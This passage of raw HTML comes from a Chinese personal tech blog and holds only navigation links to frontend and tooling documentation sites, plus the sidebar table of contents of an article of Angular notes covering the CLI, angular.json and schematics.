  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://leafletjs.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  leaflet
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.tslang.cn/docs/home.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  TypeScript
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://docschina.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  印记中文
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav> <div style="margin-left:20px;margin-right:20px;">
    音乐
    <div role="switch" class="el-switch"><input type="checkbox" name="" true-value="true" class="el-switch__input"><!----><span class="el-switch__core" style="width:40px;"></span><!----></div> <audio><source src="/vuebloger/mp3/065b_520b_0409_111c898908eab454414c3c326fe77c36.mp3" type="audio/mpeg"></audio></div></div></header> <div class="sidebar-mask"></div> <div class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/vuebloger/timeLine/" class="nav-link">首页</a></div><div class="nav-item"><a href="/vuebloger/technology/" class="nav-link router-link-active">技术</a></div><div class="nav-item"><a href="/vuebloger/life/" class="nav-link">生活</a></div><div class="nav-item"><a href="/vuebloger/bake/" class="nav-link">备忘</a></div><div class="nav-item"><a href="/vuebloger/tags/" class="nav-link">标签库</a></div><div class="nav-item"><a href="/vuebloger/about/" class="nav-link">关于</a></div><div class="nav-item"><a href="/vuebloger/massage/" class="nav-link">留言板</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title">链接</span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="https://gitee.com/xccjh/projects" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Gitee
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://nextjs.frontendx.cn/docs/#%E5%AE%89%E8%A3%85" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Nextjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://zh.nuxtjs.org/guide/installation" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Nuxtjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://angularjs.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  AngularJS
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://reactnative.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ReactNative
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://element-cn.eleme.io/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ElementUI
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://youzan.github.io/vant/#/zh-CN/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Vant
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://developer.mozilla.org/zh-CN/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MDN
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://www.fontawesome.com.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  Fontawesome
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://developers.weixin.qq.com/miniprogram/dev/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  MiniProgram
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://reacttraining.com/react-router/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  react-router-dom
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://webpack.js.org/concepts/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  webpack
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.babeljs.cn/docs/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  babel
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://eslint.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  eslint
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.swiper.com.cn/api/index.html/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  swiper
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="http://momentjs.cn/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  momentjs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.runoob.com/linux/linux-shell.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  shell
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://lodash.com/docs/4.17.15#template" target="_blank" rel="noopener noreferrer" class="nav-link external">
  lodash
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://koa.bootcss.com/#links" target="_blank" rel="noopener noreferrer" class="nav-link external">
  koa
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://jestjs.io/docs/en/getting-started" target="_blank" rel="noopener noreferrer" class="nav-link external">
  jest
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://aui.github.io/art-template/zh-cn/docs/index.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  art-template
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://ejs.bootcss.com/#docs" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ejs
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.layui.com/doc/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  layui
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://antv-g2.gitee.io/zh/examples/gallery" target="_blank" rel="noopener noreferrer" class="nav-link external">
  G2
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.echartsjs.com/zh/option.html#title" target="_blank" rel="noopener noreferrer" class="nav-link external">
  ECharts
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.vagrantup.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  vagrant
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://docs.docker.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  docker
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="/vuebloger/technology/ https:/www.runoob.com/redis/redis-tutorial.html" class="nav-link">redis</a></li><li class="dropdown-item"><!----> <a href="https://www.runoob.com/mysql/mysql-tutorial.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  mysql
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://leafletjs.com/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  leaflet
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://www.tslang.cn/docs/home.html" target="_blank" rel="noopener noreferrer" class="nav-link external">
  TypeScript
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li><li class="dropdown-item"><!----> <a href="https://docschina.org/" target="_blank" rel="noopener noreferrer" class="nav-link external">
  印记中文
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div></div> <!----></nav>  <ul class="sidebar-links"><li><div class="sidebar-group first"><p class="sidebar-heading open"><span>angular知识点总结</span> <!----></p> <ul class="sidebar-group-items"><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#angular简介" class="sidebar-link">angular简介</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#开始项目" class="sidebar-link">开始项目</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#cli命令" class="sidebar-link">cli命令</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#项目目录解析" class="sidebar-link">项目目录解析</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#angular-json全解" class="sidebar-link">angular.json全解</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schema" class="sidebar-link">$schema</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#version" class="sidebar-link">version</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schematics" class="sidebar-link">schematics</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#cli" class="sidebar-link">cli</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#newprojectroot" class="sidebar-link">newProjectRoot</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#projects" class="sidebar-link">projects</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#project" class="sidebar-link">project</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schematics的工作区配置项" class="sidebar-link">Schematics的工作区配置项</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#architect配置项" class="sidebar-link">architect配置项</a></li></ul></li><li><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#angular-cli-schematics" class="sidebar-link">Angular Cli Schematics</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schematics一些基本概念" class="sidebar-link">Schematics一些基本概念</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schematics-cli" class="sidebar-link">schematics-cli</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#schematics-cli使用实例" class="sidebar-link">schematics-cli使用实例</a></li><li class="sidebar-sub-header"><a href="/vuebloger/technology/angular%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93.html#自定义schematics-lib" class="sidebar-link">自定义Schematics Lib</a></li></ul></li><li><a 